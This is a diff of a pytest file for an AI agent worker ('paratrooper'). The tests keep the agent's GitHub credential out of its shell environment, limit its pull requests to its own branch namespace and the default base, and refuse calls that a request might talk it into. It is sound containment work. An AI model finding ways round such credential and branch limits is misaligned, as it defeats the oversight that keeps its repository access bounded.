+    assert not out.get("is_error"), out
+    assert _payload(out)["existing"] is True
+    assert ctx.last_pr == "https://github.com/o/r/pull/7"
+
+
+def test_open_pull_request_refuses_a_stranger_branch_or_base(tmp_path, monkeypatch):
+    """Both halves of the merge boundary, checked where the credential is: the
+    head must be the agent's own namespace and the base is always the site's
+    default branch, never something a request talked it into."""
+    import paratrooper.agent.tools as tools_mod
+
+    def boom(*args, **kwargs):
+        raise AssertionError("nothing may reach GitHub on a refused call")
+
+    monkeypatch.setattr(tools_mod.github, "find_open_pull_request", boom)
+    monkeypatch.setattr(tools_mod.github, "create_pull_request", boom)
+    _fake_repo(monkeypatch, [])
+    handlers = _tool_handlers(_handoff_ctx(tmp_path))
+
+    out = asyncio.run(handlers["open_pull_request"]({
+        "branch": "feature/x", "title": "t", "body": "b",
+    }))
     assert out.get("is_error")
-    out = asyncio.run(handlers["report_pr"]({"url": "https://github.com/o/r/pull/7"}))
+    assert "paratrooper/" in out["content"][0]["text"]
+
+    out = asyncio.run(handlers["open_pull_request"]({
+        "branch": "paratrooper/x", "title": "t", "body": "b", "base": "production",
+    }))
     assert out.get("is_error")
+    assert "production" in out["content"][0]["text"]
+
+    out = asyncio.run(handlers["open_pull_request"]({"branch": "paratrooper/x", "body": "b"}))
+    assert out.get("is_error")  # a pull request with no title
+
+
+def test_list_pull_requests_narrows_to_the_agents_namespace(tmp_path, monkeypatch):
+    """This is the 'is there pending work' step, so it must answer about the
+    agent's own branches and not about anything else open on the repository."""
+    import paratrooper.agent.tools as tools_mod
+
+    seen: dict = {}
+
+    def fake_list(owner, repo, *, token, branch_prefix="", client=None):
+        seen.update(owner=owner, repo=repo, token=token, branch_prefix=branch_prefix)
+        return [{"number": 7, "branch": "paratrooper/x", "title": "t", "url": "u"}]
+
+    monkeypatch.setattr(tools_mod.github, "open_pull_requests", fake_list)
+    _fake_repo(monkeypatch, [])
+    handlers = _tool_handlers(_handoff_ctx(tmp_path))
+
+    out = asyncio.run(handlers["list_pull_requests"]({}))
+    assert not out.get("is_error"), out
+    assert _payload(out)["pull_requests"][0]["number"] == 7
+    assert seen == {"owner": "o", "repo": "r", "token": "ghs-minted",
+                    "branch_prefix": "paratrooper/"}
+
+
+def test_the_handoff_tools_say_so_when_there_is_no_credential(tmp_path, monkeypatch):
+    """A local run has no GitHub credential. The tools must say that plainly
+    rather than half-running: there is no second road to fall back to."""
+    import paratrooper.agent.tools as tools_mod
+
+    def boom(*args, **kwargs):
+        raise AssertionError("nothing may reach GitHub without a credential")
+
+    for name in ("find_open_pull_request", "create_pull_request", "open_pull_requests"):
+        monkeypatch.setattr(tools_mod.github, name, boom)
+    pushed: list[str] = []
+    _fake_repo(monkeypatch, pushed)
+    handlers = _tool_handlers(_handoff_ctx(tmp_path, token=None))
+
+    for out in (
+        asyncio.run(handlers["push_branch"]({"branch": "paratrooper/x"})),
+        asyncio.run(handlers["open_pull_request"]({"branch": "paratrooper/x", "title": "t"})),
+        asyncio.run(handlers["list_pull_requests"]({})),
+    ):
+        assert out.get("is_error")
+        assert "no GitHub credential" in out["content"][0]["text"]
+    assert pushed == []
 
 
 def test_append_changelog_branch_is_explicit(tmp_path):
@@ -1238,15 +1673,17 @@ def test_run_job_emits_pr_event_from_reported_pr(tmp_path, monkeypatch):
     assert result.branch == "paratrooper/twen-new-photo"
 
 
-def test_run_job_hands_github_auth_to_the_session_env(tmp_path, monkeypatch):
-    """With the PAT configured, the session options must carry what git/gh
-    actually read — GH_TOKEN plus the askpass wiring — with the token only in
-    env values, never inside the helper file (it echoes the var by name)."""
+def test_run_job_gives_the_credential_to_the_tools_and_not_to_the_session(tmp_path, monkeypatch):
+    """The whole of this phase in one assertion. The worker still holds a GitHub
+    credential and the handoff tools still get it; what changed is that the
+    session's environment carries none of it, so no shell the agent opens can
+    read one, sensibly or otherwise."""
     import paratrooper.agent.worker as worker_mod
 
     captured: dict = {}
 
     def fake_build_tool_server(ctx):
+        captured["ctx"] = ctx
         return {"name": "paratrooper"}, []
 
     async def fake_query(*, prompt, options):
@@ -1263,24 +1700,22 @@ def test_run_job_hands_github_auth_to_the_session_env(tmp_path, monkeypatch):
     result = asyncio.run(worker_mod.run_job(job, config=_tool_cfg(tmp_path)))
 
     assert result.status == "done"
+    assert captured["ctx"].github_token == "ghp-sekret"  # the tools have it
     env = captured["options"].env
-    assert env["GH_TOKEN"] == "ghp-sekret"  # gh's native variable
-    assert env["PARATROOPER_GIT_ASKPASS_TOKEN"] == "ghp-sekret"
-    askpass = Path(env["GIT_ASKPASS"])
-    assert askpass.exists() and os.access(askpass, os.X_OK)
-    body = askpass.read_text()
-    assert "PARATROOPER_GIT_ASKPASS_TOKEN" in body  # echoes by name...
-    assert "ghp-sekret" not in body  # ...never by value
+    for gone in ("GH_TOKEN", "GIT_ASKPASS", "PARATROOPER_GIT_ASKPASS_TOKEN"):
+        assert gone not in env, gone
+    assert "ghp-sekret" not in "".join(env.values())
 
 
-def test_run_job_without_github_token_skips_auth_env(tmp_path, monkeypatch):
-    """No PAT (local dev) must mean no partial wiring: the three GitHub values
-    are simply absent and the job still runs cleanly."""
+def test_run_job_without_a_github_token_hands_the_tools_none(tmp_path, monkeypatch):
+    """No credential (local dev) must mean no partial wiring: the tools are told
+    plainly that there is none rather than being handed an empty string."""
     import paratrooper.agent.worker as worker_mod
 
     captured: dict = {}
 
     def fake_build_tool_server(ctx):
+        captured["ctx"] = ctx
         return {"name": "paratrooper"}, []
 
     async def fake_query(*, prompt, options):
@@ -1297,9 +1732,51 @@ def test_run_job_without_github_token_skips_auth_env(tmp_path, monkeypatch):
     result = asyncio.run(worker_mod.run_job(job, config=_tool_cfg(tmp_path)))
 
     assert result.status == "done"
+    assert captured["ctx"].github_token is None
     env = captured["options"].env
     for key in ("GH_TOKEN", "GIT_ASKPASS", "PARATROOPER_GIT_ASKPASS_TOKEN"):
         assert key not in env
+
+
+def test_run_job_refreshes_the_checkout_before_the_turn(tmp_path, monkeypatch):
+    """The agent cannot fetch any more, so the worker does it: without this the
+    session branches off whatever the default branch looked like at boot and
+    never sees the branch of a pull request it is meant to continue. A failed
+    refresh warns and lets the turn run — a network blip must not become a
+    message that never gets answered."""
+    import paratrooper.agent.worker as worker_mod
+
+    calls: list = []
+
+    class _Repo:
+        def __init__(self, *args, **kwargs):
+            calls.append(kwargs)
+
+        def fetch(self):
+            calls.append("fetched")
+
+    async def fake_query(*, prompt, options):
+        if False:
+            yield
+
+    monkeypatch.setenv("PARATROOPER_GITHUB_TOKEN", "ghp-sekret")
+    monkeypatch.setattr(worker_mod, "configure_auth", lambda mode: "api")
+    monkeypatch.setattr(worker_mod, "build_tool_server", lambda ctx: ({"name": "p"}, []))
+    monkeypatch.setattr(worker_mod, "query", fake_query)
+    monkeypatch.setattr(worker_mod, "SiteRepo", _Repo)
+
+    job = worker_mod.Job(job_id="j5", thread_id="t1", text="add the pin")
+    assert asyncio.run(worker_mod.run_job(job, config=_tool_cfg(tmp_path))).status == "done"
+    assert "fetched" in calls
+    assert calls[0]["github_token"] == "ghp-sekret"
+
+    class _Broken(_Repo):
+        def fetch(self):
+            raise RuntimeError("the remote is unreachable")
+
+    monkeypatch.setattr(worker_mod, "SiteRepo", _Broken)
+    job = worker_mod.Job(job_id="j6", thread_id="t1", text="just chatting")
+    assert asyncio.run(worker_mod.run_job(job, config=_tool_cfg(tmp_path))).status == "done"
 
 
 def test_run_job_hands_the_branch_word_to_both_the_prompt_and_the_guard(tmp_path, monkeypatch):
@@ -1586,10 +2063,9 @@ def test_run_job_env_carries_no_worker_only_secret(tmp_path, monkeypatch, with_t
     assert asyncio.run(worker_mod.run_job(job, config=_tool_cfg(tmp_path))).status == "done"
 
     env = captured["options"].env
-    expected = {"CLAUDE_CODE_SUBPROCESS_ENV_SCRUB", "GIT_TERMINAL_PROMPT"}
-    if with_token:
-        expected |= {"GH_TOKEN", "GIT_ASKPASS", "PARATROOPER_GIT_ASKPASS_TOKEN"}
-    assert set(env) == expected
+    # an exact set, and the same one with or without a credential configured:
+    # from this item on, nothing about GitHub reaches the session at all
+    assert set(env) == {"CLAUDE_CODE_SUBPROCESS_ENV_SCRUB", "GIT_TERMINAL_PROMPT"}
     assert not [k for k in env if k.startswith("SPOTIFY_")]
     assert "REDIS_URL" not in env and "PARATROOPER_REDIS_URL" not in env
 
